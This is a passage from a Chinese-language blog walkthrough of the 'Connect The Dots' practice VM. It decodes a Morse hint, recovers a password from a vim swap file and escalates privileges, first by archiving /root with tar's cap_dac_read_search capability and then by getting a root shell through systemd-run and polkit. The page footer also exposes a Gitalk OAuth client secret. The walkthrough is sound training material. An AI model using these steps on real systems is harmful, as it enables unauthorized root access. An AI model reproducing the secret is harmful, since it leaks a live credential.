72<br>Bit Depth                       : 24<br>Video Frame Rate                : 2.285<br>Media Data Size                 : 5584<br>Media Data Offset               : 717<br>Image Size                      : 224x224<br>Megapixels                      : 0.050<br>Avg Bitrate                     : 14.6 kbps<br>Rotation                        : 0<br>======== game.jpg.bak<br>ExifTool Version Number         : 12.57<br>File Name                       : game.jpg.bak<br>Directory                       : .<br>File Size                       : 40 kB<br>File Modification Date/Time     : 2019:10:10 22:16:38-04:00<br>File Access Date/Time           : 2023:06:12 10:27:16-04:00<br>File Inode Change Date/Time     : 2023:06:12 10:27:16-04:00<br>File Permissions                : -rw-r--r--<br>File Type                       : JPEG<br>File Type Extension             : jpg<br>MIME Type                       : image/jpeg<br>JFIF Version                    : 1.01<br>Resolution Unit                 : inches<br>X Resolution                    : 192<br>Y Resolution                    : 192<br>Exif Byte Order                 : Big-endian (Motorola, MM)<br>Orientation                     : Horizontal (normal)<br>Comment                         : .... . -.-- ....... -. --- .-. .-. .. ... --..-- ....... -.-- --- ..- .----. ...- . ....... -- .- -.. . ....... - .... .. ... ....... ..-. .- .-. .-.-.- ....... ..-. .- .-. ....... ..-. .- .-. ....... ..-. .-. --- -- ....... .... . .- ...- . -. ....... .-- .- -. -. .- ....... ... . . ....... .... . .-.. .-.. ....... -. --- .-- ..--.. ....... .... .- .... .- ....... -.-- --- ..- ....... ... ..- .-. . .-.. -.-- ....... -- .. ... ... . -.. ....... -- . --..-- ....... -.. .. -.. -. .----. - ....... -.-- --- ..- ..--.. ....... --- .... ....... -.. .- -- -. ....... -- -.-- ....... -... .- - - . .-. -.-- ....... .. ... ....... .- -... --- ..- - ....... - --- ....... -.. .. . ....... .- -. -.. ....... .. ....... .- -- ....... ..- -. .- -... .-.. . ....... - --- ....... ..-. .. -. -.. ....... -- -.-- ....... -.-. .... .- .-. --. . .-. ....... ... --- ....... --.- ..- .. -.-. -.- .-.. -.-- ....... .-.. . .- ...- .. -. --. ....... .- ....... .... .. -. - ....... .. -. ....... .... . .-. . ....... -... . ..-. --- .-. . ....... - .... .. ... ....... ... -.-- ... - . -- ....... ... .... ..- - ... ....... -.. --- .-- -. ....... .- ..- - --- -- .- - .. -.-. .- .-.. .-.. -.-- .-.-.- ....... .. ....... .- -- ....... ... .- ...- .. -. --. ....... - .... . ....... --. .- - . .-- .- -.-- ....... - --- ....... -- -.-- ....... -.. ..- -. --. . --- -. ....... .. -. ....... .- ....... .----. ... . -.-. .-. . - ..-. .. .-.. . .----. ....... .-- .... .. -.-. .... ....... .. ... ....... .--. ..- -... .-.. .. -.-. .-.. -.-- ....... .- -.-. -.-. . ... ... .. -... .-.. . .-.-.-<br>Image Width                     : 712<br>Image Height                    : 350<br>Encoding Process                : Progressive DCT, Huffman coding<br>Bits Per Sample                 : 8<br>Color Components                : 3<br>Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)<br>Image Size                      : 712x350<br>Megapixels                      : 0.249<br>======== hits.txt.bak<br>ExifTool Version Number         : 12.57<br>File Name                       : hits.txt.bak<br>Directory                       : .<br>File Size                       : 29 bytes<br>File Modification Date/Time     : 2019:10:10 22:26:23-04:00<br>File Access Date/Time           : 2023:06:12 10:27:22-04:00<br>File Inode Change Date/Time     : 2023:06:12 10:27:22-04:00<br>File Permissions                : -rw-r--r--<br>File Type                       : TXT<br>File Type Extension             : txt<br>MIME Type                       : text/plain<br>MIME Encoding                   : us-ascii<br>Newlines                        : (none)<br>Line Count                      : 1<br>Word Count                      : 1<br>======== m.gif.bak<br>ExifTool Version Number         : 12.57<br>File Name                       : m.gif.bak<br>Directory                       : .<br>File Size                       : 933 kB<br>File Modification Date/Time     : 2019:10:10 21:43:29-04:00<br>File Access Date/Time           : 2023:06:12 10:27:27-04:00<br>File Inode Change Date/Time     : 2023:06:12 10:27:27-04:00<br>File Permissions                : -rw-r--r--<br>File Type                       : GIF<br>File Type Extension             : gif<br>MIME Type                       : image/gif<br>GIF Version                     : 89a<br>Image Width                     : 245<br>Image Height                    : 245<br>Has Color Map                   : Yes<br>Color Resolution Depth          : 8<br>Bits Per Pixel                  : 8<br>Background Color                : 255<br>Animation Iterations            : Infinite<br>XMP Toolkit                     : Adobe XMP Core 5.3-c011 66.145661, 2012/02/06-14:56:27<br>Creator Tool                    : Adobe Photoshop CS6 (Macintosh)<br>Instance ID                     : xmp.iid:085685312E1611E2A32B9E634BBB29DA<br>Document ID                     : xmp.did:085685322E1611E2A32B9E634BBB29DA<br>Derived From Instance ID        : xmp.iid:A5C200202E1511E2A32B9E634BBB29DA<br>Derived From Document ID        : xmp.did:085685302E1611E2A32B9E634BBB29DA<br>Transparent Color               : 255<br>Frame Count                     : 25<br>Duration                        : 2.50 s<br>Image Size                      : 245x245<br>Megapixels                      : 0.060<br>    4 image files <span class="hljs-built_in">read</span><br></code></pre></td></tr></table></figure>
+
+<p>发现了字符串，似乎是摩斯电码，尝试在线工具解码</p>
+<p><img src="/pic/2318451b3ceba9077ac3987e32ddd86a_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>解码成功，得到了字符串，给了一个提示，意思是说有个 ‘secretfile’可以被公开访问，密码就在其中，继续查看 bak 文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/connectthedots]<br>└─$ <span class="hljs-built_in">cat</span> hits.txt.bak <br>https://pastebin.com/ZV1MLSEE<br></code></pre></td></tr></table></figure>
+
+<p>给了一个网址，打开还是提示我们要尽力枚举。我们进到网站目录下看看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">norris@sirrom:~/ftp/files$ <span class="hljs-built_in">cd</span> /var/www/html<br>norris@sirrom:/var/www/html$ <span class="hljs-built_in">ls</span> -liah<br>total 368K<br>264592 drwxr-xr-x 4 root     root     4.0K Oct 11  2019 .<br>264591 drwxr-xr-x 3 root     root     4.0K Oct 11  2019 ..<br>312910 -rw-r--r-- 1 www-data www-data 6.2K Oct 11  2019 backups<br>312911 -rw-r--r-- 1 www-data www-data  325 Oct 11  2019 backups.html<br>312916 -rw-r--r-- 1 www-data www-data  77K Oct 10  2019 bootstrap.bundle.min.js<br>312918 -rw-r--r-- 1 www-data www-data 153K Oct 10  2019 bootstrap.min.css<br>312909 -rw-r--r-- 1 www-data www-data   44 Oct 11  2019 hits.txt<br>312905 drwxr-xr-x 2 www-data www-data 4.0K Oct 11  2019 images<br>312904 -rw-r--r-- 1 www-data www-data 2.2K Oct 11  2019 index.htm<br>266382 -rw-r--r-- 1 www-data www-data 2.0K Oct 11  2019 index.html<br>312919 -rw-r--r-- 1 www-data www-data  70K Oct 10  2019 jquery.slim.min.js<br>312880 -rw-r--r-- 1 www-data www-data  879 Oct 11  2019 landing.css<br>312866 drwxr-xr-x 2 www-data www-data 4.0K Oct 11  2019 mysite<br>312922 -rw-r--r-- 1 www-data www-data   99 Oct 11  2019 secretfile<br>312917 -rw------- 1 www-data www-data  12K Oct 11  2019 .secretfile.swp<br></code></pre></td></tr></table></figure>
+
+<p>确实有个 <code>secretfile</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">norris@sirrom:/var/www/html$ <span class="hljs-built_in">cat</span> secretfile <br>I see you<span class="hljs-string">&#x27;re here for the password. Holy Moly! Battery is dying !! Mentioning below for reference.</span><br></code></pre></td></tr></table></figure>
+
+<p>但是似乎没有信息，还有个 swp 文件，用户权限无法打开，经过搜索发现，可能是 vi 或者 vim 的缓存文件，wget 下载到本机，然后使用 <code>vim -r</code> 命令打开得到下图的结果</p>
+<p><img src="/pic/fa9653bfc2a374c36947a5d7e5aacc33_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>这样我们就拿到了又一个密码，尝试登录，经过测试发现是 <code>morris</code> 的密码，登录成功后，发现并不是 root 权限，还是需要进行提权。可以按照之前的手法来提权，这里复现一下红队笔记中采用的提权思路</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">norris@sirrom:/var/www/html$ su morris<br>Password: <br>morris@sirrom:/var/www/html$ <span class="hljs-built_in">cd</span> /home<br>morris@sirrom:/home$ <span class="hljs-built_in">ls</span><br>morris  norris<br>morris@sirrom:/home$ <span class="hljs-built_in">cd</span> morris<br>morris@sirrom:~$ <span class="hljs-built_in">ls</span><br>Templates<br>morris@sirrom:~$ <span class="hljs-built_in">id</span><br>uid=1000(morris) gid=1000(morris) <span class="hljs-built_in">groups</span>=1000(morris),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth),117(lpadmin),118(scanner)<br><br></code></pre></td></tr></table></figure>
+
+<h3 id="tar-命令读取-root-txt"><a href="#tar-命令读取-root-txt" class="headerlink" title="tar 命令读取 root.txt"></a>tar 命令读取 root.txt</h3><p>morris 和 norris 两个用户似乎差别并没有那么大，接下来就先在 norris 找一下提权的突破点</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">norris@sirrom:/var/www/html$ /sbin/getcap -r / 2&gt;/dev/null<br>/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep<br>/usr/bin/tar = cap_dac_read_search+ep<br>/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep<br>/usr/bin/ping = cap_net_raw+ep<br>norris@sirrom:/var/www/html$ su morris<br>Password: <br>morris@sirrom:/var/www/html$ /sbin/getcap -r / 2&gt;/dev/null<br>/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep<br>/usr/bin/tar = cap_dac_read_search+ep<br>/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep<br>/usr/bin/ping = cap_net_raw+ep<br>morris@sirrom:/var/www/html$ tar -zcvf root.tat.gz /root<br>bash: /usr/bin/tar: Permission denied<br>morris@sirrom:/var/www/html$ <span class="hljs-built_in">exit</span><br><span class="hljs-built_in">exit</span><br>norris@sirrom:~$ tar -zcvf root.tar.gz /root<br>tar: Removing leading `/\<span class="hljs-string">&#x27; from member names</span><br><span class="hljs-string">/root/</span><br><span class="hljs-string">/root/root.txt</span><br><span class="hljs-string">/root/.bashrc</span><br><span class="hljs-string">/root/.gnupg/</span><br><span class="hljs-string">/root/.gnupg/private-keys-v1.d/</span><br><span class="hljs-string">/root/.bash_history</span><br><span class="hljs-string">/root/.cache/</span><br><span class="hljs-string">/root/.local/</span><br><span class="hljs-string">/root/.local/share/</span><br><span class="hljs-string">/root/.local/share/nano/</span><br><span class="hljs-string">/root/.profile</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
+
+<p>虽然两个用户的权限看起来一样，但是执行起来后，只有 norris 可以将 root 目录下的东西进行打包，解压缩后查看文件内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">norris@sirrom:~$ tar -zxvf root.tar.gz <br>root/<br>root/root.txt<br>root/.bashrc<br>root/.gnupg/<br>root/.gnupg/private-keys-v1.d/<br>root/.bash_history<br>root/.cache/<br>root/.local/<br>root/.local/share/<br>root/.local/share/nano/<br>root/.profile<br>norris@sirrom:~$ <span class="hljs-built_in">cat</span> root/root.txt <br>8fc9376d961670ca10be270d52eda423<br></code></pre></td></tr></table></figure>
+
+<p>emmm，怎么说呢，这个思路确实很骚，在一些只希望获取到某些文件或者 flag 的情况下或许会非常有帮助，而 getcap 命令我是第一次见到，也算学习了</p>
+<h3 id="polkit-agent-helper-1-提权"><a href="#polkit-agent-helper-1-提权" class="headerlink" title="polkit-agent-helper-1 提权"></a>polkit-agent-helper-1 提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">norris@sirrom:~$ find / -<span class="hljs-built_in">type</span> f -perm -u=s 2&gt;/dev/null<br>/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper<br>/usr/lib/xorg/Xorg.wrap<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/lib/policykit-1/polkit-agent-helper-1<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/lib/openssh/ssh-keysign<br>/usr/sbin/pppd<br>/usr/sbin/mount.nfs<br>/usr/bin/gpasswd<br>/usr/bin/umount<br>/usr/bin/newgrp<br>/usr/bin/passwd<br>/usr/bin/fusermount<br>/usr/bin/chfn<br>/usr/bin/bwrap<br>/usr/bin/mount<br>/usr/bin/su<br>/usr/bin/pkexec<br>/usr/bin/ntfs-3g<br>/usr/bin/chsh<br>/usr/bin/sudo<br></code></pre></td></tr></table></figure>
+
+<p>polkit-agent-helper-1 用于提权我也是第一次遇到，之后还是得按红队笔记的视频汇总一下提权手法</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">morris@sirrom:~$ systemd-run -t bash<br>==== AUTHENTICATING FOR org.freedesktop.systemd1.manage-units ===<br>Authentication is required to manage system services or other units.                                                <br>Authenticating as: norris,,, (norris)<br>Password: <br>==== AUTHENTICATION COMPLETE ===<br>Running as unit: run-u127.service                                                                                   <br>Press ^] three <span class="hljs-built_in">times</span> within 1s to disconnect TTY.<br>root@sirrom:/<span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br>root@sirrom:/<span class="hljs-comment"># cat /root/root.txt</span><br>8fc9376d961670ca10be270d52eda423<br>root@sirrom:/<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<p>polkit 是 Linux 权限管理的一套机制（policy kit），helper 是当操作文件需要权限的时候，helper 会给一个交互界面，如果想办法调用 helper 进而带来权限上的提升。systemd-run 是临时启动高权限，这时候就会调用 helper，进而获取到 helper 属主的权限。这里有个有意思的事情，就是运行后需要授权密码，需要的是 norris 的密码</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/knowledge-database/" class="category-chain-item">knowledge_database</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Connect The Dots</div>
+      <div>https://i3eg1nner.github.io/2023/06/4719fa4167fd.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>I3eg1nner</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年6月12日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/06/9dfa91b67af1.html" title="">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/06/f734793d82e5.html" title="MonitorsTwo靶机">
+                        <span class="hidden-mobile">MonitorsTwo靶机</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="gitalk-container"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#gitalk-container', function() {
+      Fluid.utils.createCssLink('/css/gitalk.css')
+      Fluid.utils.createScript('https://lib.baomitu.com/gitalk/1.8.0/gitalk.min.js', function() {
+        var options = Object.assign(
+          {"clientID":"a14e9a13405642f51885","clientSecret":"5662f466deab58fdbbacd0ae3718eaf1625401dd","repo":"gitalk","owner":"I3eg1nner","admin":["I3eg1nner"],"language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
+          {
+            id: '60d214ee24cdff0dbbd2053cc507dda3'
+          }
+        )
+        var gitalk = new Gitalk(options);
+        gitalk.render('gitalk-container');
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
